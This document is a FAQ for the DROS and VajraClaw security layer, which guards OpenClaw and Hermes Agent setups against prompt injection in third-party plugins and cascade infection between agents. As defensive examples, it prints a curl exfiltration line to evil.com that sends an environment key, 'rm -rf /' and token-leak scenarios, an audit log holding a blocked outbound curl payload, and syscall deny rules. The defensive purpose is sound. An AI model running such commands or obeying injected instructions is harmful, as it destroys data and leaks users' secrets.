# DROS & VajraClaw Zero-Trust Safety Governance FAQ
## Geek's Hands-on Defense Guide for OpenClaw & Hermes Agent Ecosystems

This FAQ is designed specifically for developers and security geeks utilizing **OpenClaw** and **Hermes Agent**. It focuses on preventing prompt injections in third-party **Skills (plugins)**, mitigating "cascade infection" in **Multi-Agent** workflows, and establishing physical-layer execution boundaries.

---

## Table of Contents
1. [Q1: As an OpenClaw / Hermes Agent user, what is the biggest risk of third-party Skills, and how does VajraClaw block malicious exploits?](#q1-as-an-openclaw--hermes-agent-user-what-is-the-biggest-risk-of-third-party-skills-and-how-does-vajraclaw-block-malicious-exploits)
2. [Q2: How do I configure `config.yaml` and DROS rules to implement a physical sandbox for OpenClaw Skills?](#q2-how-do-i-configure-configyaml-and-dros-rules-to-implement-a-physical-sandbox-for-openclaw-skills)
3. [Q3: Hermes Agent desktop version has local Terminal execution rights. How do we prevent it from running 'rm -rf' or leaking keys after an indirect prompt injection?](#q3-hermes-agent-desktop-version-has-local-terminal-execution-rights-how-do-we-prevent-it-from-running-rm--rf-or-leaking-keys-after-an-indirect-prompt-injection)
4. [Q4: Multi-Agent workflows are vulnerable to 'cascade infection' and 'privilege escalation'. How does DROS's BEC Chain solve this?](#q4-multi-agent-workflows-are-vulnerable-to-cascade-infection-and-privilege-escalation-how-does-dross-bec-chain-solve-this)
5. [Q5: What is the mathematical formula for BEC Chain intersection calculation? Will it slow down OpenClaw / Hermes Agent?](#q5-what-is-the-mathematical-formula-for-bec-chain-intersection-calculation-will-it-slow-down-openclaw--hermes-agent)
6. [Q6: When an interception occurs, how does DROS perform cryptographic auditing and non-repudiation tracing?](#q6-when-an-interception-occurs-how-does-dros-perform-cryptographic-auditing-and-non-repudiation-tracing)
7. [Q7: Will running DROS & VajraClaw disrupt my existing OpenClaw / Hermes Agent development workflow?](#q7-will-running-dros--vajraclaw-disrupt-my-existing-openclaw--hermes-agent-development-workflow)

---

### Q1: As an OpenClaw / Hermes Agent user, what is the biggest risk of third-party Skills, and how does VajraClaw block malicious exploits?

*   **Geek's Pain Point**: Third-party Skills downloaded from marketplaces may carry hidden prompt injections or contain malicious python code (e.g., `os.system("curl http://evil.com/leak?key=" + env_key)`).
*   **VajraClaw Physical Defense**:
    1.  **FFI Binary Interception**: The VajraClaw SDK (compiled in native C/Go) sits between the Agent decision layer and the OS. When a hijacked Agent attempts an unauthorized Tool Call, VajraClaw intercepts the request via `evaluateToolCallWithAudit()`.
    2.  **Thread-Level Syscall Monitoring**: If malicious code tries to bypass the Agent framework and call the OS directly, DROS's **GuardVM** captures the Syscall at the kernel level. If it isn't explicitly authorized by the execution credential, GuardVM issues a `SIGKILL` to immediately terminate the process.

---

### Q2: How do I configure `config.yaml` and DROS rules to implement a physical sandbox for OpenClaw Skills?

To restrict third-party Skills, developers must define containment policies in DROS's `config.yaml` and policy manifests for `agent.skills.*`.

#### Configuration 1: Edit `config.yaml` to Enable Thread Isolation
Ensure your `config.yaml` has the GuardVM isolation flags enabled:
```yaml
# ====================== DROS 7.3 Skill Isolation Config ======================
guard_vm:
  # Enable thread-level runtime containment
  enable_thread_isolation: true
  
  # Sensitive syscalls prohibited for all untrusted third-party Skills
  forbidden_syscalls:
    - "sys_execve"      # Prevent execution of arbitrary binaries
    - "sys_socket"      # Prevent direct network socket creation (data exfiltration)
    
  # Exclusive path whitelist for third-party sandboxes
  allowed_sandbox_paths:
    - "./scratch"
    - "./User_Pavilion/temp"
```

#### Configuration 2: Define Rules for Skill Capabilities (BEC)
When OpenClaw dynamic loads a Skill, it receives a temporary By-Execution Certificate (BEC). Bind it to a rule whitelist:
```json
{
  "rule_id": "rule_openclaw_skills_default",
  "actor": "agent.skills.*",
  "conditions": { "action": ["read_file", "write_file", "execute_command"] },
  "constraints": {
    "paths": {
      "match": "^\\./(scratch|User_Pavilion/temp)/.*",
      "allow": true
    },
    "commands": { "match": ".*", "allow": false },
    "network": { "outbound": false }
  },
  "behavior": "DENY_AND_ALERT"
}
```
*   **Tip**: Mark all downloaded third-party plugins as `untrusted` at initialization, forcing VajraClaw to auto-apply the narrowest `DENY_AND_ALERT` sandbox rules.

---

### Q3: Hermes Agent desktop version has local Terminal execution rights. How do we prevent it from running 'rm -rf' or leaking keys after an indirect prompt injection?

*   **Geek's Pain Point**: When debugging, Hermes Agent parses a compromised file containing a jailbreak instruction, leading the LLM to trigger terminal commands like `rm -rf /` or leak your `.git/config` token.
*   **VajraClaw Physical Defense**:
    1.  **Token Stream DFA Filtering**: Outgoing token streams flow through `matchTokenStreamWithAudit()`. VajraClaw's C/Go DFA state machine identifies and strips dangerous exfiltration patterns or hijacked command instructions in microseconds.
    2.  **Allowed Scopes Lockdown**: Even if the LLM is fully tricked and invokes the `execute_command` tool, VajraClaw checks the active BEC. Since the allowed scopes do not authorize root writes or key directory access, VajraClaw blocks the execution before it reaches the terminal shell.

---

### Q4: Multi-Agent workflows are vulnerable to 'cascade infection' and 'privilege escalation'. How does DROS's BEC Chain solve this?

*   **Cascade Infection**: Agent A (web crawler) gets infected by a malicious webpage. It commands Agent B (database administrator) to wipe the user tables. Since Agent B trusts its peer (Agent A), it executes the purge.
*   **DROS Solution: Cryptographic BEC Chain**:
    DROS mandates that all inter-agent communications carry a cryptographically signed **BEC Chain** in their request context.
    When Agent B receives a command, the VajraClaw SDK traces the calling chain upward and computes the **intersection of capabilities**.

---

### Q5: What is the mathematical formula for BEC Chain intersection calculation? Will it slow down OpenClaw / Hermes Agent?

For a collaboration chain of $Agent_1 \rightarrow Agent_2 \rightarrow \dots \rightarrow Agent_n \rightarrow \text{System Tool}$, VajraClaw evaluates the following **dynamic intersection**:

$$\text{Effective Scope} = \bigcap_{i=1}^{n} \text{Scope}(Agent_i)$$

#### Case Analysis:
*   $Agent_A$ (Low-privilege Web Crawler) Scope: `{ Read: /tmp/crawler, Call: Agent B }`
*   $Agent_B$ (High-privilege DB Admin) Scope: `{ Read: /database/main, Write: /database/main }`
*   When a compromised Agent A commands Agent B to write to the database, VajraClaw evaluates:
    $$\text{Effective Scope} = \text{Scope}(Agent_A) \cap \text{Scope}(Agent_B) = \emptyset$$
*   Since the intersection evaluates to empty, VajraClaw **melts the call in less than 1 millisecond**, rejecting Agent B's database execution.

#### Performance Metrics:
*   **Zero Token Overhead**: Verification and cryptographic checks run strictly locally in memory. **No remote LLM API calls are involved**.
*   **Microsecond Latency**: Built in native C/Go, the Vajra DSL rules engine utilizes an **O(1) Bitmap algorithm**. Policy checks take only **10 to 50 microseconds**, adding completely negligible overhead to LLM execution cycles.

---

### Q6: When an interception occurs, how does DROS perform cryptographic auditing and non-repudiation tracing?

Upon blocking a call, VajraClaw outputs a cryptographically signed audit log that proves the origin of infection:

```json
{
  "timestamp": "2026-06-10T23:45:00Z",
  "action": "BLOCK_TOOL_CALL",
  "tool": "execute_bash_command",
  "attempted_payload": "curl http://evil-attacker.com/leak",
  "error_code": "ERR_BEC_SCOPE_VIOLATION",
  "bec_chain": [
    { "agent": "OpenClaw_DBManager_Agent", "execution_id": "exec-99b8", "sign": "0x8aef..." },
    { "agent": "OpenClaw_WebCrawler_Agent", "execution_id": "exec-124a", "sign": "0xfd42..." }
  ],
  "taint_analysis": {
    "source": "OpenClaw_WebCrawler_Agent",
    "reason": "Token Stream matched pattern [URL_OUTBOUND_LEAK] from input data stream"
  }
}
```
Through `taint_analysis` and `bec_chain`, administrators can instantly pinpoint that the crawler was compromised, clearing the DB manager of insider liability.

---

### Q7: Will running DROS & VajraClaw disrupt my existing OpenClaw / Hermes Agent development workflow?

**Almost completely transparent, intervening only under active exploits.**

*   **No Code Changes**: Developers can write Skills and Multi-Agent scripts without altering business code logic. Just maintain standard Python code routines.
*   **Configure Once, Defend Everywhere**: DROS operates behind the scenes, intercepting downstream FFI calls and token streams. Developers only see alerts when a Skill attempts to breach the boundaries defined in `config.yaml`.
*   **The Ultimate ABS (Anti-lock Braking System) for Agents**: It lets AI run at full speed while guarding the physical execution boundaries, keeping local networks safe without hurting developer UX.
